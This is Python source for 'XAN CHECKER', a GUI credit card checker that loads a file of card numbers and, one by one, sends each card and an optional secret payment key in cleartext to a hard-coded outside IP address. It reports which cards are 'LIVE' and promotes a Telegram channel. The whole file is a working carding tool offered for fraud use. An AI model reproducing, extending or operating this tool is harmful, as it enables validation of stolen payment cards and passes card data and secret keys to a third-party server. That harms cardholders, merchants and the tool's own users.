import tkinter as tk
from tkinter import ttk
from ttkthemes import ThemedTk
from tkinter import filedialog  # Add this import
import os
import time
import random
import json
import requests

def icon():
    result_text.config(state='normal')
    result_text.insert('insert', '                    v1.2\n', 'title')
    result_text.insert('insert', '               [ XAN CHECKER ]\n', 'title')
    result_text.insert('insert', '\n', 'title')
    result_text.insert('insert', '             by roaxx & rockyy\n', 'title')
    result_text.insert('insert', '\n', 'title')
    result_text.config(state='disabled')

def check_cc():
    cc_file = cc_file_entry.get()
    sk_enabled = sk_checkbox_var.get()

    if sk_enabled:
        sk_key = sk_key_entry.get()
        with open(cc_file, 'r') as requests_file:
            for line in requests_file:
                cx = line.strip()
                url = f"http://51.20.124.87/man.php?sk={sk_key}&cc={cx}"  # live api
                try:
                    response = requests.get(url, verify=False)
                    if "APPROVED" in response.text:
                        result_text.config(state='normal')
                        result_text.insert('insert', f"LIVE - {cx} | t: @xancheck\n", 'live')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                    elif "DECLINED" in response.text:
                        result_text.config(state='normal')
                        result_text.insert('insert', f"DEAD - {cx}\n", 'dead')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                    elif "Request rate limit exceeded" in response.text:
                        result_text.config(state='normal')
                        result_text.insert('insert', f"RATELIMIT - {cx}\n", 'ratelimit')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                    else:
                        result_text.config(state='normal')
                        result_text.insert('insert', "DEAD - SK KEY DEAD/OR SMTH\n", 'dead')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                except requests.RequestException as e:
                    result_text.config(state='normal')
                    result_text.insert('insert', f"DEAD - {cx} | {e}\n", 'dead')
                    result_text.config(state='disabled')
                    result_text.update()
                    time.sleep(0.7)
    else:
        with open(cc_file, 'r') as requests_file:
            for line in requests_file:
                cx = line.strip()
                url = f"http://51.20.124.87/xan2.php?cc={cx}"  # 2update soon
                try:
                    response = requests.get(url, verify=False)
                    if "APPROVED" in response.text:
                        result_text.config(state='normal')
                        result_text.insert('insert', f"LIVE - {cx} | telegram: @xancheck\n", 'live')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                    elif "DECLINED" in response.text:
                        result_text.config(state='normal')
                        result_text.insert('insert', f"DEAD - {cx} | telegram: @xancheck\n", 'dead')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                    elif "rate limit" in response.text:
                        result_text.config(state='normal')
                        result_text.insert('insert', f"RATELIMIT - {cx}\n", 'ratelimit')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.7)
                    else:
                        result_text.config(state='normal')
                        result_text.insert('insert', "our public api is overloaded, check https://t.me/xancheck for more info 🗿\n", 'dead')
                        result_text.config(state='disabled')
                        result_text.update()
                        time.sleep(0.8)
                except requests.RequestException as e:
                    result_text.config(state='normal')
                    result_text.insert('insert', f"DEAD - {cx} | {e}\n", 'dead')
                    result_text.config(state='disabled')
                    result_text.update()
                    time.sleep(0.7)

def browse_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    cc_file_entry.delete(0, 'end')
    cc_file_entry.insert(0, file_path)

root = ThemedTk(theme='radiance')
root.title("XAN CHECKER")

style = ttk.Style(root)
style.configure('TButton', padding=6)
style.configure('title.TLabel', font=('Helvetica', 14, 'bold'))
style.configure('live.TLabel', foreground='green')
style.configure('dead.TLabel', foreground='red')
style.configure('ratelimit.TLabel', foreground='orange')

frame = ttk.Frame(root)
frame.pack(padx=10, pady=10)

cc_file_label = ttk.Label(frame, text="CC File:")
cc_file_label.grid(row=0, column=0)

cc_file_entry = ttk.Entry(frame)
cc_file_entry.grid(row=0, column=1)

browse_button = ttk.Button(frame, text="Browse", command=browse_file)
browse_button.grid(row=0, column=2)

sk_checkbox_var = tk.IntVar()
sk_checkbox = ttk.Checkbutton(frame, text="Enable SK Key", variable=sk_checkbox_var)
sk_checkbox.grid(row=1, column=0, columnspan=3, pady=5)

sk_key_label = ttk.Label(frame, text="SK Key:")
sk_key_label.grid(row=2, column=0)

sk_key_entry = ttk.Entry(frame)
sk_key_entry.grid(row=2, column=1)

check_button = ttk.Button(frame, text="Check CC", command=check_cc)
check_button.grid(row=3, column=0, columnspan=3, pady=10)

result_text = tk.Text(frame, height=10, width=40)
result_text.grid(row=4, column=0, columnspan=3)

result_text.tag_configure('title', font=('Helvetica', 12, 'bold'))
result_text.tag_configure('live', foreground='green')
result_text.tag_configure('dead', foreground='red')
result_text.tag_configure('ratelimit', foreground='orange')

icon()

root.mainloop()
